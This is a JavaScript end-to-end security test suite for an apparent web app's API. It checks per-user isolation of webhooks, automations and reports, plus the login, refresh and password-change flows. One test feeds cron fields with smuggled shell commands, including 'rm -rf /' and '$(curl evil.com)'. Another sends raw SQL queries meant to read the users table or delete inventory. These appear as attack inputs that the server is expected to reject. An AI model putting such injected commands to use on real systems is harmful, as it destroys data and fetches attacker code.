// End-to-end integration tests for security fixes
// Tests full flows across multiple endpoints to verify security holistically
import { describe, expect, test, beforeAll } from 'bun:test';
import crypto from 'crypto';

const BASE_URL = process.env.TEST_BASE_URL ? `${process.env.TEST_BASE_URL}/api` : `http://localhost:${process.env.PORT || 3000}/api`;
let userAToken = null;
let userBToken = null;
let csrfToken = null;

beforeAll(async () => {
    const resA = await fetch(`${BASE_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: 'demo@vaultlister.com',
            password: 'DemoPassword123!'
        })
    });
    const dataA = await resA.json();
    userAToken = dataA.token;
    csrfToken = dataA.csrfToken || null;

    const resB = await fetch(`${BASE_URL}/auth/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            email: `e2e_${Date.now()}@test.com`,
            password: 'E2eTestPassword123!',
            username: `e2e_${Date.now()}`
        })
    });
    const dataB = await resB.json();
    userBToken = dataB.token;
});

function authHeaders(token, includeJson = true) {
    const h = { 'Authorization': `Bearer ${token}` };
    if (includeJson) h['Content-Type'] = 'application/json';
    if (csrfToken) h['X-CSRF-Token'] = csrfToken;
    return h;
}

describe('E2E: Webhook Lifecycle Security', () => {
    test('full webhook create-receive-verify flow', async () => {
        if (!userAToken) return;
        const createRes = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: authHeaders(userAToken),
            body: JSON.stringify({
                name: `e2e_lifecycle_${Date.now()}`,
                url: 'https://example.com/e2e-hook',
                events: ['sale.created']
            })
        });
        // 201 = created, 403 = CSRF or tier restriction
        expect([201, 403]).toContain(createRes.status);
        if (createRes.status !== 201) return;

        const createData = await createRes.json();
        const secret = createData.secret || createData.endpoint?.secret;
        const endpointId = createData.id || createData.endpoint?.id;
        expect(secret).toBeDefined();

        // User B should NOT see User A's endpoint
        if (userBToken) {
            const listRes = await fetch(`${BASE_URL}/webhooks/endpoints`, {
                headers: authHeaders(userBToken, false)
            });
            expect(listRes.status).toBe(200);
            const listData = await listRes.json();
            const endpoints = Array.isArray(listData) ? listData : (listData.endpoints || []);
            const found = endpoints.find(ep => ep.id === endpointId);
            expect(found).toBeUndefined();
        }

        if (endpointId) {
            await fetch(`${BASE_URL}/webhooks/endpoints/${endpointId}`, {
                method: 'DELETE',
                headers: authHeaders(userAToken, false)
            });
        }
    });

    test('webhook upsert rotates secret correctly', async () => {
        if (!userAToken) return;
        const name = `e2e_upsert_${Date.now()}`;

        const res1 = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: authHeaders(userAToken),
            body: JSON.stringify({ name, url: 'https://example.com/v1', events: ['test'] })
        });
        if (res1.status === 403) return; // CSRF or tier restriction
        const data1 = await res1.json();
        const secret1 = data1.secret || data1.endpoint?.secret;

        const res2 = await fetch(`${BASE_URL}/webhooks/endpoints`, {
            method: 'POST',
            headers: authHeaders(userAToken),
            body: JSON.stringify({ name, url: 'https://example.com/v2', events: ['sale.created'] })
        });
        if (res2.status === 403) return;
        const data2 = await res2.json();
        const secret2 = data2.secret || data2.endpoint?.secret;

        if (secret1 && secret2) {
            expect(secret2).not.toBe(secret1);
        }
    });
});

describe('E2E: Automation Security Flow', () => {
    test('create automation with valid cron and verify isolation', async () => {
        if (!userAToken) return;
        const createRes = await fetch(`${BASE_URL}/automations`, {
            method: 'POST',
            headers: authHeaders(userAToken),
            body: JSON.stringify({
                name: `E2E Auto ${Date.now()}`,
                type: 'custom',
                schedule: '30 8 * * 1-5',
                config: { action: 'e2e-test' },
                isEnabled: false
            })
        });
        expect([200, 201, 403]).toContain(createRes.status);

        if (createRes.status === 201 || createRes.status === 200) {
            const createData = await createRes.json();
            const ruleId = createData.rule?.id || createData.id;

            if (userBToken && ruleId) {
                const getRes = await fetch(`${BASE_URL}/automations/${ruleId}`, {
                    headers: authHeaders(userBToken, false)
                });
                expect(getRes.status).toBe(404);
            }

            if (ruleId) {
                await fetch(`${BASE_URL}/automations/${ruleId}`, {
                    method: 'DELETE',
                    headers: authHeaders(userAToken, false)
                });
            }
        }
    });

    test('cron injection attempts should all fail', async () => {
        if (!userAToken) return;
        const maliciousCrons = [
            '* * * ; rm -rf /',
            '$(curl evil.com)',
            '`whoami` * * * *',
        ];

        for (const schedule of maliciousCrons) {
            const response = await fetch(`${BASE_URL}/automations`, {
                method: 'POST',
                headers: authHeaders(userAToken),
                body: JSON.stringify({
                    name: 'Injection Test ' + Date.now(),
                    type: 'custom',
                    schedule,
                    config: {}
                })
            });
            // 400/422 = validation, 403 = CSRF/tier (all acceptable rejections)
            expect([400, 403, 422]).toContain(response.status);
        }
    });
});

describe('E2E: Report Security Flow', () => {
    test('create report and verify data isolation', async () => {
        if (!userAToken) return;
        const createRes = await fetch(`${BASE_URL}/reports`, {
            method: 'POST',
            headers: authHeaders(userAToken),
            body: JSON.stringify({
                name: `E2E Report ${Date.now()}`,
                widgets: [{ type: 'revenue_chart', order: 0 }],
                date_range: '30d'
            })
        });
        // 201 = created, 403 = CSRF restriction, 429 = rate limited
        expect([201, 403, 429]).toContain(createRes.status);
        if (createRes.status !== 201) return;

        const createData = await createRes.json();
        const reportId = createData.report?.id;

        if (userBToken && reportId) {
            const getRes = await fetch(`${BASE_URL}/reports/${reportId}`, {
                headers: authHeaders(userBToken, false)
            });
            expect(getRes.status).toBe(404);
        }

        if (reportId) {
            await fetch(`${BASE_URL}/reports/${reportId}`, {
                method: 'DELETE',
                headers: authHeaders(userAToken, false)
            });
        }
    });

    test('SQL injection attempts via custom query should all fail', async () => {
        if (!userAToken) return;
        const injections = [
            "SELECT * FROM users",
            "DELETE FROM inventory WHERE 1=1",
            "SELECT * FROM inventory UNION SELECT * FROM users",
        ];

        for (const sql of injections) {
            const response = await fetch(`${BASE_URL}/reports/query`, {
                method: 'POST',
                headers: authHeaders(userAToken),
                body: JSON.stringify({ sql })
            });
            expect([400, 403, 429]).toContain(response.status);
        }
    });
});

describe('E2E: Auth Token Lifecycle', () => {
    test('full register-login-refresh-logout flow', async () => {
        const email = `e2e_lc_${Date.now()}@test.com`;
        const password = 'LifecycleTest123!';

        const regRes = await fetch(`${BASE_URL}/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email,
                password,
                username: `lc_${Date.now()}`
            })
        });
        if (regRes.status === 429) return;
        expect(regRes.status).toBe(201);
        const regData = await regRes.json();
        expect(regData.token).toBeDefined();
        expect(regData.refreshToken).toBeDefined();

        const loginRes = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        if (loginRes.status === 429) return;
        expect(loginRes.status).toBe(200);
        const loginData = await loginRes.json();
        const accessToken = loginData.token;
        const refreshToken = loginData.refreshToken;

        const meRes = await fetch(`${BASE_URL}/auth/me`, {
            headers: { 'Authorization': `Bearer ${accessToken}` }
        });
        if (meRes.status === 429) return;
        expect(meRes.status).toBe(200);

        const refreshRes = await fetch(`${BASE_URL}/auth/refresh`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken })
        });
        if (refreshRes.status === 429) return;
        expect(refreshRes.status).toBe(200);
        const refreshData = await refreshRes.json();
        expect(refreshData.token).toBeDefined();

        const logoutRes = await fetch(`${BASE_URL}/auth/logout`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ refreshToken })
        });
        expect([200, 429]).toContain(logoutRes.status);
    });

    test('password change invalidates old password', async () => {
        const email = `e2e_pw_${Date.now()}@test.com`;
        const password = 'OriginalPass123!';
        const newPassword = 'ChangedPass456!';

        const regRes = await fetch(`${BASE_URL}/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email,
                password,
                username: `pw_${Date.now()}`
            })
        });
        if (regRes.status === 429) return;
        expect(regRes.status).toBe(201);
        const regData = await regRes.json();
        const token = regData.token;

        const pwRes = await fetch(`${BASE_URL}/auth/password`, {
            method: 'PUT',
            headers: authHeaders(token),
            body: JSON.stringify({
                currentPassword: password,
                newPassword
            })
        });
        if (pwRes.status === 429) return;
        expect(pwRes.status).toBe(200);

        const oldLoginRes = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        expect([401, 429]).toContain(oldLoginRes.status);

        const newLoginRes = await fetch(`${BASE_URL}/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password: newPassword })
        });
        expect([200, 429]).toContain(newLoginRes.status);
    });
});

describe('E2E: Cross-Resource Isolation', () => {
    test('new user starts with empty resources', async () => {
        if (!userBToken) return;

        const invRes = await fetch(`${BASE_URL}/inventory`, {
            headers: { 'Authorization': `Bearer ${userBToken}` }
        });
        expect(invRes.status).toBe(200);
        const invData = await invRes.json();
        const items = invData.items || invData.inventory || [];
        expect(items.length).toBe(0);

        const repRes = await fetch(`${BASE_URL}/reports`, {
            headers: { 'Authorization': `Bearer ${userBToken}` }
        });
        expect(repRes.status).toBe(200);
        const repData = await repRes.json();
        expect((repData.reports || []).length).toBe(0);

        const autoRes = await fetch(`${BASE_URL}/automations`, {
            headers: { 'Authorization': `Bearer ${userBToken}` }
        });
        expect(autoRes.status).toBe(200);
        const autoData = await autoRes.json();
        expect((autoData.rules || []).length).toBe(0);
    });

    test('User B cannot modify User A resources via ID guessing', async () => {
        if (!userBToken) return;

        const updateRes = await fetch(`${BASE_URL}/reports/00000000-0000-0000-0000-000000000001`, {
            method: 'PUT',
            headers: authHeaders(userBToken),
            body: JSON.stringify({ name: 'Hacked Report' })
        });
        expect([403, 404]).toContain(updateRes.status);

        const deleteRes = await fetch(`${BASE_URL}/automations/00000000-0000-0000-0000-000000000001`, {
            method: 'DELETE',
            headers: authHeaders(userBToken, false)
        });
        expect([403, 404]).toContain(deleteRes.status);
    });
});
